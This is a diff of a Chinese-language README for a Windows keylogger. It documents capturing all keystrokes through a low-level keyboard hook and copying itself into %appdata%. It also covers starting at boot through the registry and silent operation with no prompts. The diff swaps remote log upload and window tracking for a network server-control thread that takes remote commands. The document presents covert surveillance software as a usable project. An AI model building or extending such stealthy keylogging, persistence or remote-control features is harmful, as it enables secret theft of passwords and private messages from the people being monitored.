@@ -26,13 +26,11 @@
 ## 功能特性
 
 - **键盘记录**：记录所有键盘输入，包括特殊按键
-- **窗口追踪**：自动记录当前活动窗口标题和时间戳
 - **快捷键控制**：支持多种快捷键进行功能控制
 - **开机自启**：可设置/取消开机自动启动
 - **静默模式**：支持静默启动，不显示任何提示
-- **日志上传**：支持自动上传日志到远程服务器
-- **智能存储**：日志按 IP 地址和日期自动分类存储
 - **自我复制**：自动复制到 `%appdata%\Keylogger` 目录运行
+- **服务器控制**：支持通过网络远程控制程序功能
 
 ---
 
@@ -91,22 +89,15 @@ Keylogger.exe
 | `Ctrl + Shift + Alt + Q` | 安全退出 | 保存日志并退出程序 |
 | `Ctrl + Shift + Alt + S` | 设置/取消开机自启 | 写入注册表，需管理员权限 |
 | `Ctrl + Shift + Alt + D` | 设置/取消静默启动 | 静默启动时不显示提示窗口 |
-| `Ctrl + Shift + Alt + U` | 开启/关闭上传功能 | 自动上传日志到远程服务器 |
 
 > **提示**：开机自启和静默启动状态会被保存到注册表，重启后依然生效。
 
 ### 日志文件
 
 - **存储位置**：`%appdata%\Keylogger\`
-- **文件名格式**：`<IP地址>_<YYYYMMDD>.log`
-  - 示例：`192.168.1.100_20260331.log`
-- **日志内容示例**：
-  ```
-  [Window: 记事本 - at 2026-03-31T14:30:25+0800] 
-  Hello World[TAB]This is a test
-  [Window: 浏览器 - at 2026-03-31T14:31:10+0800] 
-  www.example.com
-  ```
+- **文件名格式**：`<用户名>_<YYYY-MM-DD_HH-MM-SS>.log`
+  - 示例：`user_2026-04-17_12-34-56.log`
+- **日志内容**：记录所有键盘输入，包括特殊按键
 
 ### 自动复制功能
 
@@ -136,21 +127,13 @@ _hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
 - 特殊按键（Shift、Ctrl、Alt 等）
 - 快捷键组合检测
 
-### 窗口追踪
+### 自我复制机制
 
-通过 `GetForegroundWindow()` 获取当前活动窗口，记录窗口标题切换：
+程序启动时会检查当前运行位置，如果不在 `%appdata%\Keylogger` 目录，则会自动复制自身到该目录并从新位置启动。
 
-```cpp
-HWND foreground = GetForegroundWindow();
-GetWindowTextA(foreground, window_title, 256);
-```
+### 服务器控制
 
-### 日志上传
-
-使用 libcurl 实现 HTTP 文件上传：
-1. 通过 API 获取认证 Token
-2. 筛选最新的日志文件
-3. 使用 PUT 请求上传到服务器
+程序启动时会启动一个服务器控制线程，用于接收和处理远程命令。
 
 ---
 
@@ -178,12 +161,14 @@ keylogger/
 │   ├── Keylogger/
 │   │   ├── Keylogger.cpp      # 主程序源代码
 │   │   └── Keylogger.vcxproj.filters  # 项目筛选器
-│   ├── LogUploader.h          # 日志上传类头文件
 │   ├── Keylogger.sln          # Visual Studio 解决方案
 │   ├── .gitignore             # Git 忽略文件
 │   ├── .gitattributes         # Git 属性配置
-│   └── README.md              # 项目说明
-└── README.md                  # 根目录说明
+│   ├── README.md              # 项目说明
+│   ├── API 文档.md            # API 文档
+│   ├── 服务器端功能文档.md        # 服务器端功能文档
+│   ├── test_server.py         # 测试服务器
+│   └── LogUploader.h          # 日志上传类头文件
 ```
 
 ---
